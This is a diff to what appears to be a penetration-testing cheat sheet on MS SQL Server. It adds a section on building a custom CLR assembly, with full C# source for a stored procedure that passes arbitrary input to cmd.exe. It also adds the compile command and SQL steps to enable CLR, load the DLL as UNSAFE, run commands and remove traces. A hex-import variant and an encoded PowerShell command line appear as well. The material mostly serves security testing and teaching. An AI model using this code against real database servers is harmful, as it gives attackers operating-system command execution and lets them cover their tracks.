@@ -27,6 +27,7 @@
 	* [Add the extended stored procedure and list extended stored procedures](#add-the-extended-stored-procedure-and-list-extended-stored-procedures)
 * [CLR Assemblies](#clr-assemblies)
 	* [Execute commands using CLR assembly](#execute-commands-using-clr-assembly)
+	* [Manually creating a CLR DLL and importing it](#manually-creating-a-clr-dll-and-importing-it)
 * [OLE Automation](#ole-automation)
 	* [Execute commands using OLE automation procedures](#execute-commands-using-ole-automation-procedures)
 * [Agent Jobs](#agent-jobs)
@@ -217,6 +218,11 @@ Get-SQLStoredProcedureXP -Instance "<DBSERVERNAME\DBInstance>" -Verbose
 
 ## CLR Assemblies
 
+Prerequisites:
+* sysadmin privileges
+* CREATE ASSEMBLY permission (or)
+* ALTER ASSEMBLY permission (or)
+
 ### Execute commands using CLR assembly
 
 ```ps1
@@ -225,6 +231,93 @@ or
 Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "powershell -e <base64>" -Verbose
 ```
 
+### Manually creating a CLR DLL and importing it
+
+Create a C# DLL file with the following content, with the command : `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library c:\temp\cmd_exec.cs`
+
+```csharp
+using System;
+using System.Data;
+using System.Data.SqlClient;
+using System.Data.SqlTypes;
+using Microsoft.SqlServer.Server;
+using System.IO;
+using System.Diagnostics;
+using System.Text;
+
+public partial class StoredProcedures
+{
+    [Microsoft.SqlServer.Server.SqlProcedure]
+    public static void cmd_exec (SqlString execCommand)
+    {
+        Process proc = new Process();
+        proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
+        proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand.Value);
+        proc.StartInfo.UseShellExecute = false;
+        proc.StartInfo.RedirectStandardOutput = true;
+        proc.Start();
+
+        // Create the record and specify the metadata for the columns.
+        SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));
+        
+        // Mark the beginning of the result set.
+        SqlContext.Pipe.SendResultsStart(record);
+
+        // Set values for each column in the row
+        record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
+
+        // Send the row back to the client.
+        SqlContext.Pipe.SendResultsRow(record);
+        
+        // Mark the end of the result set.
+        SqlContext.Pipe.SendResultsEnd();
+        
+        proc.WaitForExit();
+        proc.Close();
+    }
+};
+```
+
+Then follow these instructions:
+
+1. Enable `show advanced options` on the server
+	```sql
+	sp_configure 'show advanced options',1; 
+	RECONFIGURE
+	GO
+	```
+2. Enable CLR on the server
+	```sql
+	sp_configure 'clr enabled',1
+	RECONFIGURE
+	GO
+	```
+3. Import the assembly
+	```sql
+	CREATE ASSEMBLY my_assembly
+	FROM 'c:\temp\cmd_exec.dll'
+	WITH PERMISSION_SET = UNSAFE;
+	```
+4. Link the assembly to a stored procedure
+	```sql
+	CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];
+	GO
+	```
+5. Execute and clean
+	```sql
+	cmd_exec "whoami"
+	DROP PROCEDURE cmd_exec
+	DROP ASSEMBLY my_assembly
+	```
+
+**CREATE ASSEMBLY** will also accept an hexadecimal string representation of a CLR DLL
+
+```sql
+CREATE ASSEMBLY [my_assembly] AUTHORIZATION [dbo] FROM 
+0x4D5A90000300000004000000F[TRUNCATED]
+WITH PERMISSION_SET = UNSAFE 
+GO 
+```
 
 ## OLE Automation
 
@@ -437,3 +530,4 @@ SELECT SYSTEM_USER
 
 * [PowerUpSQL Cheat Sheet & SQL Server Queries - Leo Pitt](https://medium.com/@D00MFist/powerupsql-cheat-sheet-sql-server-queries-40e1c418edc3)
 * [PowerUpSQL Cheat Sheet - Scott Sutherland](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)
+* [Attacking SQL Server CLR Assemblies - Scott Sutherland - July 13th, 2017](https://blog.netspi.com/attacking-sql-server-clr-assemblies/)
